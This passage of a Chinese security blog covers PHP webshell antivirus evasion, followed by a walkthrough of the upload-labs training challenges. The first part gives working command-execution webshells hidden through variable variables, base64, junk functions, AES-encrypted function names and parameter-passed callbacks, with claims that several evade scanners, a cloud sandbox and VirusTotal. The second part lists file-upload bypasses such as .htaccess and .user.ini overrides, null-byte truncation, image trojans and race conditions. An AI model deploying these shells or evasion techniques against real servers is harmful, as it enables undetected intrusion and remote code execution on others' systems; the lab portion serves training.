+<h2 id="8-1-可变变量绕过"><a href="#8-1-可变变量绕过" class="headerlink" title="8.1 可变变量绕过"></a>8.1 可变变量绕过</h2><p>一些安全检测机制会直接扫描代码中是否包含敏感函数调用，对此可以把敏感的函数名隐藏在可变变量中。</p>
+<p>下面通过把 shell_exec 隐藏到可变变量中实现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$v</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line"><span class="variable">$$v</span>=<span class="string">&quot;shell_exec&quot;</span>; <span class="comment">#相当于是 $x=&quot;shell_exec&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 河马查杀能检测出来。</p>
+<p>单纯的可变变量特性一般过不了杀软，该方法通常需要和其他绕过方法配合使用。</p>
+<h2 id="8-2-各种加密绕过"><a href="#8-2-各种加密绕过" class="headerlink" title="8.2 各种加密绕过"></a>8.2 各种加密绕过</h2><p>将特征函数先用某种加密方式加密，再解密。</p>
+<p>比如简单的base64加密：</p>
+<p>在木马中把密文解密后调用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$v</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;c2hlbGxfZXhlYw==&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单的加密过不了杀软，还是能被检测出来。</p>
+<p>但是，可以考虑和代码混淆一起使用。在代码中加入与主要功能无关的代码，可以干扰分析工具和反病毒软件的检测，提高隐蔽性。</p>
+<p>在此基础上，增加safe_waf和Safe两个无用函数并调用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data1</span> = <span class="string">&quot;1qazxsw23edcvfr45tgb&quot;</span>;</span><br><span class="line">    <span class="variable">$data2</span> = <span class="string">&quot;1qazXSW@3edcVFR<span class="subst">$6yhn</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$data3</span> = <span class="string">&quot;!QAZxsw2#EDCvfr4%TGB&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data1</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$data1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$a_safe</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">10</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$a_safe</span>[] = <span class="title function_ invoke__">md5</span>(<span class="variable">$j</span>.<span class="variable">$data2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Safe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$t</span> = <span class="string">&quot;1qazxsw23edcvfr45tgb&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DD</span>(<span class="params"><span class="variable">$Data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">safe_waf</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">DD</span>(<span class="string">&quot;c2hlbGxfZXhlYw==&quot;</span>)(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">Safe</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改后可以过通过河马。然而可以被云沙箱检测出来（<a target="_blank" rel="noopener" href="https://sandbox.dbappsecurity.com.cn/">安恒云沙箱</a>）。</p>
+<p>此外，加密函数可以考虑采用更复杂的加密，比如<strong>AES加密</strong>。</p>
+<p>首先写一个加密代码，在本地生成一个key和密文：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateKey</span>(<span class="params"><span class="variable">$length</span> = <span class="number">32</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$length</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="string">&#x27;aes-256-cbc&#x27;</span>));</span><br><span class="line">    <span class="variable">$ciphertext</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$ciphertext</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">generateKey</span>();</span><br><span class="line"><span class="variable">$original_data</span> = <span class="string">&quot;shell_exec&quot;</span>;</span><br><span class="line"><span class="variable">$encrypted_data</span> = <span class="title function_ invoke__">encrypt</span>(<span class="variable">$original_data</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;key = &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$key</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Encrypted Data: &quot;</span> . <span class="variable">$encrypted_data</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = 88c266a678f21d1713e14b032e16475897290d86a692f818bbd89234d7757ec4</span><br><span class="line">Encrypted Data: xlri1KQnFm7Z7osHErvWBZn9tFtE5uSX9gZ1yNSef2s=</span><br></pre></td></tr></table></figure>
+
+<p>然后在木马中传入密文和key，并写一个解码函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DD</span>(<span class="params"><span class="variable">$Data</span>, <span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Data</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="string">&#x27;aes-256-cbc&#x27;</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$c</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$k</span>), OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">DD</span>(<span class="string">&quot;xlri1KQnFm7Z7osHErvWBZn9tFtE5uSX9gZ1yNSef2s=&quot;</span>,<span class="string">&quot;88c266a678f21d1713e14b032e16475897290d86a692f818bbd89234d7757ec4&quot;</span>)(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该样例可以逃过安恒的沙箱查杀。试一试河马和VT，也可以通过。</p>
+<h2 id="8-3-传参绕过"><a href="#8-3-传参绕过" class="headerlink" title="8.3 传参绕过"></a>8.3 传参绕过</h2><p>可以把传入的函数名写在请求中获取，通过将函数名动态地从外部传递。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$v</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时可以把func传参为system，把xxx作为命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.*/test.php?func=system&amp;xxx=echo hack</span><br></pre></td></tr></table></figure>
+
+<p>该方法可以与回调函数结合：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$v</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合前面的加密绕过思路，加密call_user_func函数：Y2FsbF91c2VyX2Z1bmM&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function DD($Data) &#123;</span><br><span class="line">    return base64_decode($Data);</span><br><span class="line">&#125;</span><br><span class="line">$f=$_GET[&#x27;func&#x27;];</span><br><span class="line">$v=$_GET[&#x27;xxx&#x27;];</span><br><span class="line">DD(&quot;Y2FsbF91c2VyX2Z1bmM=&quot;)($f,$v);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该例子仍能被河马查杀。可以采用更复杂的加密函数尝试。</p>
+<h2 id="8-3-传参混淆"><a href="#8-3-传参混淆" class="headerlink" title="8.3 传参混淆"></a>8.3 传参混淆</h2><p>使用php中的分隔函数，用某个符号把传入的参数做一个分隔，再结合回调函数调用执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DD</span>(<span class="params"><span class="variable">$Data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;!&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">DD</span>(<span class="string">&quot;Y2FsbF91c2VyX2Z1bmM=&quot;</span>)(<span class="variable">$a</span>[<span class="number">0</span>],<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以传入 ?s&#x3D;system!echo hack 达到目的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.*/test.php?s=system!echo hack</span><br></pre></td></tr></table></figure>
+
+<p>该方法可以避开河马查杀。 VT上通过所有杀软。沙箱检测也顺利绕过。</p>
+<h1 id="9-upload-labs-21关"><a href="#9-upload-labs-21关" class="headerlink" title="9 upload-labs 21关"></a>9 upload-labs 21关</h1><h3 id="Pass-01-前端检验绕过"><a href="#Pass-01-前端检验绕过" class="headerlink" title="Pass-01 前端检验绕过"></a>Pass-01 前端检验绕过</h3><p>js对上传做了限制，将相应的js语句删掉，或者将js禁用。</p>
+<hr>
+<h3 id="Pass-02-MIME类型"><a href="#Pass-02-MIME类型" class="headerlink" title="Pass-02 MIME类型"></a>Pass-02 MIME类型</h3><p>用burp进行抓包，修改信息头。</p>
+<p>将<code>Content-Type: application/x-php</code>修改为<code>Content-Type: image/jpeg</code>。</p>
+<hr>
+<h3 id="Pass-03-黑名单绕过之php3、php5"><a href="#Pass-03-黑名单绕过之php3、php5" class="headerlink" title="Pass-03 黑名单绕过之php3、php5"></a>Pass-03 黑名单绕过之php3、php5</h3><p>文件的后缀名进行了限制。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="title function_">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但是，在php中，.php3、.php4、.php5、.pht、.phtml、.phps 的文件都会被解析为 php 文件。</p>
+<p>因此，我们需要将原来的<code>kali.php</code>改为<code>kali.phtml</code>即可。当然这种方法也只有低版本的php中才能复现。</p>
+<p>可以上传.php5文件，但该文件不一定能够执行。</p>
+<hr>
+<h3 id="Pass-04-黑名单绕过-htaccess和文件名叠加特性绕过"><a href="#Pass-04-黑名单绕过-htaccess和文件名叠加特性绕过" class="headerlink" title="Pass-04 黑名单绕过.htaccess和文件名叠加特性绕过"></a>Pass-04 黑名单绕过.htaccess和文件名叠加特性绕过</h3><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>环境：Apache，没限制.htaccess文件。</p>
+<p>.htaccess 是配置文件，通常位于网站的根目录或特定的文件中，并影响该目录及子目录。每个目录都可以有这个文件。.htaccess文件可以通过文本编辑器直接进行修改或创建，且修改后会立马生效，不用重启。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">文件名：.htaccess</span><br><span class="line"></span><br><span class="line">上传给Apache的任意文件类型，都当作php文件来解析</span><br><span class="line">&lt;FilesMatch &quot;&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 将后缀名为 h-t-m 的文件解析为 php 脚本执行</span><br><span class="line">AddType application/x-httpd-php .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件用 php处理器 来处理，效果同上</span><br><span class="line">AddHandler php5-script .h-t-m</span><br><span class="line"># 将所有文件解析为 php 脚本执行</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这一步phpstudy8.1失败，phpstudy2018成功</p>
+</blockquote>
+<hr>
+<h4 id="分号配合IIS解析漏洞"><a href="#分号配合IIS解析漏洞" class="headerlink" title="分号配合IIS解析漏洞"></a>分号配合IIS解析漏洞</h4><p>环境：IIS</p>
+<p><code>muma.asp;.jpg</code>可以绕过图片限制，含有“.asp”，可以当做asp文件正常解析。</p>
+<hr>
+<h4 id="冒号配合PHP和Windows文件命名环境的叠加特性"><a href="#冒号配合PHP和Windows文件命名环境的叠加特性" class="headerlink" title="冒号配合PHP和Windows文件命名环境的叠加特性"></a>冒号配合PHP和Windows文件命名环境的叠加特性</h4><p>利用PHP和Windows环境的叠加特性，在Windows直接修改文件名称，不能直接加冒号。我们先以图片的格式上传，然后抓包，修改文件名称，加上冒号，上传一个名为<code>123.php:.jpg</code>的文件。</p>
+<p>但是，这样上传的是0KB的123.php文件。在抓包工具中将文件名改为<code>123.&lt;</code>或<code>123.&lt;&lt;&lt;</code>或<code>123.&gt;&gt;&gt;</code>或<code>123.&gt;&gt;&lt;</code>后再次上传，重写123.php文件内容，WebShell代码就会写入原来的空文件中。</p>
+<p>这种方式分两步：1.上传文件；2.追加写入内容。</p>
+<hr>
+<h3 id="Pass-05-user-ini"><a href="#Pass-05-user-ini" class="headerlink" title="Pass-05 .user.ini"></a>Pass-05 .user.ini</h3><p>黑名单中没有<code>.ini</code>，<code>php.ini</code> 是 php 的配置文件，<code>.user.ini</code> 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p>
+<blockquote>
+<p>注意：该pass要求php版本大于等于5.3.0版本</p>
+<p>CGI／FastCGI模式</p>
+</blockquote>
+<p>创建 <code>.user.ini </code>文件，内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=userini.baidu</span><br><span class="line">//指定一个文件，自动包含在要执行的文件后。</span><br></pre></td></tr></table></figure>
+
+<p>上传<code>.user.ini</code>。</p>
+<p>上传<code>userini.baidu</code>文件，内容为一句话木马。</p>
+<p>再访问上传目录下的<code>readme.php</code>(经测试，任意php文件都可以)，即可将<code>userini.baidu</code>内的内容脚本正常执行。</p>
+<p>例如：<a target="_blank" rel="noopener" href="http://localhost/upload-labs/upload/readme.php">http://localhost/upload-labs/upload/readme.php</a></p>
+<hr>
+<h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06 大小写绕过"></a>Pass-06 大小写绕过</h3><p>上传时后缀.php改为.phP等大写字母。</p>
+<blockquote>
+<p>用蚁剑测试时，CGI模式失败，Apache模式成功。</p>
+</blockquote>
+<h3 id="Pass-07-空格点"><a href="#Pass-07-空格点" class="headerlink" title="Pass-07 空格点"></a>Pass-07 空格点</h3><p>环境：Windows</p>
+<p>抓包，文件名后缀.php改为<code>.php .</code>，上传后，服务器文件名后缀还是.php。</p>
+<h3 id="Pass-08-空格点、点空格"><a href="#Pass-08-空格点、点空格" class="headerlink" title="Pass-08 空格点、点空格"></a>Pass-08 空格点、点空格</h3><p>环境：Windows</p>
+<p>抓包，文件名后缀.php改为<code>.php .</code>或<code>.php.空格</code> ，上传后，服务器文件名后缀还是.php。</p>
+<h3 id="Pass-09-基于文件流特性-DATA绕过"><a href="#Pass-09-基于文件流特性-DATA绕过" class="headerlink" title="Pass-09 基于文件流特性::$DATA绕过"></a>Pass-09 基于文件流特性::$DATA绕过</h3><p>Windows下ntfs文件流特性。</p>
+<p>源代码没有以下限制：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA（源代码没有这句）</span><br></pre></td></tr></table></figure>
+
+<p>抓包，文件名后缀.php改为<code>.php::$DATA</code> ，上传后，服务器文件名后缀还是.php。</p>
+<h3 id="Pass-10-点空格点"><a href="#Pass-10-点空格点" class="headerlink" title="Pass-10 点空格点"></a>Pass-10 点空格点</h3><p>抓包，文件名后缀.php改为<code>.php. .</code>，上传后，服务器文件名后缀还是.php。</p>
+<h3 id="Pass-11-双写"><a href="#Pass-11-双写" class="headerlink" title="Pass-11 双写"></a>Pass-11 双写</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = <span class="title function_">str_ireplace</span>($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法一</strong></p>
+<p>直接上传1.pphphp木马文件，上传后，服务器文件名后缀还是.php。</p>
+<p><strong>方法二</strong></p>
+<p>上传1.php木马文件，抓包拦截，修改filename为1.pphphp，上传后，服务器文件名后缀还是.php。</p>
+<h3 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 %00截断"></a>Pass-12 %00截断</h3><blockquote>
+<p>php版本调至5.2.17 </p>
+<p>php magic_quotes_gpc&#x3D;Off</p>
+</blockquote>
+<p>当 PHP 在处理文件名或路径时，如果遇到 URL 编码的 %00，它会被解释为一个空字节（ASCII 值为 0）。在php5.3以前，PHP 会将这个空字节转换为 \000 的形式。</p>
+<p>而恰恰在php5.3以前，文件名出现\0000,会导致文件名被截断，只保留%00之前的部分。这样的情况可能会导致文件被保存到一个意外的位置，从而产生安全风险。</p>
+<p>这是因为php语言的底层是c语言，而\0在c语言中是字符串的结束符，所以导致00截断的发生。</p>
+<p>点击上传1.jpg木马图片，抓包拦截，在POST的路径后加上1.php%00，后面不管是什么东西都会被截断掉，然后经过move_uploaded_file函数将临时文件重新复制给我们的截断之前的文件路径。即把上传的木马图片内容存到1.php中。最后upload目录下保存了1.php文件。</p>
+<h3 id="Pass-13-00绕过"><a href="#Pass-13-00绕过" class="headerlink" title="Pass-13 00绕过"></a>Pass-13 00绕过</h3><blockquote>
+<p>php版本调至5.2.17 </p>
+<p>php magic_quotes_gpc&#x3D;Off</p>
+</blockquote>
+<p>本关接受值从get变成了post，它俩的区别就是get会自行解码，而post不会解码，所以需要对%00进行解码。所以在这一关我们就需要在web.php后面加一个占位符，将其16进制改为00（空字节），这样控制符就出现了，最后在上传文件的时候就会触发\00截断。</p>
+<p>上传1.jpg木马图片，抓包拦截，在下方..&#x2F;upload&#x2F;后加上1.php%，点击Hex，以16进制模式浏览，找到php后面的%，将其16进制换成00，上传后，服务器文件名是刚才指定的1.php。（上传php文件也可以，只要内容是木马就行，然后filename改成后缀为.jpg来通过白名单，在&#x2F;upload&#x2F;后指定一个php文件名，再跟一个字符，在Hex模式中将这个字符改为00就行了）</p>
+<h3 id="Pass-14-图片🐎"><a href="#Pass-14-图片🐎" class="headerlink" title="Pass-14 图片🐎"></a>Pass-14 图片🐎</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd执行</span><br><span class="line">copy /b test.png+1.php muma.png</span><br><span class="line">test.png普通图片|1.php木马|muma.png图片马</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pass-15-图片🐎"><a href="#Pass-15-图片🐎" class="headerlink" title="Pass-15 图片🐎"></a>Pass-15 图片🐎</h3><p>同Pass-14。</p>
+<h3 id="Pass-16-图片🐎"><a href="#Pass-16-图片🐎" class="headerlink" title="Pass-16 图片🐎"></a>Pass-16 图片🐎</h3><p>php开启php_exif，上传图片🐎。</p>
+<p>利用<code>include.php?file=图片路路径</code>加载即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">http://localhost/upload-labs/include.php?file=upload/8720240816064213.png</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17 二次渲染"></a>Pass-17 二次渲染</h3><p>php开启php_gd2。</p>
+<h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">该代码执行后新建一个包含木马的文件</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;qing.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//txt中一般写一句话木马</span></span><br></pre></td></tr></table></figure>
+
+<p>Burp Intruder创建两个，一个发上传php文件，一个发访问php文件，赶在服务器删除文件之前访问并生成木马文件。</p>
+<blockquote>
+<p>在 Intruder 下的 Positions 页面可以看到我们上传文件抓到的包，我们只需一直发送这个包即可。首先在 Positions 页面点击<code>clear §</code>，转到 Payloads 页面修改 Payload type，选择 Null payloads。之后该页面就会多一个条目 Payload Option [Null payloads]，这里选择 Continue indefinitely（无限重复）。</p>
+</blockquote>
+<h3 id="Pass-19-条件竞争之重命名竞争"><a href="#Pass-19-条件竞争之重命名竞争" class="headerlink" title="Pass-19 条件竞争之重命名竞争"></a>Pass-19 条件竞争之重命名竞争</h3><p>环境：老版本Apache（2.x之后为新版本）</p>
+<p>Apache默认把.7z后缀的文件当做php解析。</p>
+<p>muma.php.7z</p>
+<h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20 /."></a>Pass-20 <code>/.</code></h3><p>上传php，保存名称直接在文件名末尾加上<code> /.</code></p>
+<h3 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h3><p>来源于CTF，审计代码。</p>
+<blockquote>
+<p>渗透测试 黑盒测试</p>
+<p>代码审计 白盒测试</p>
+<p>灰盒测试 黑+白</p>
+</blockquote>
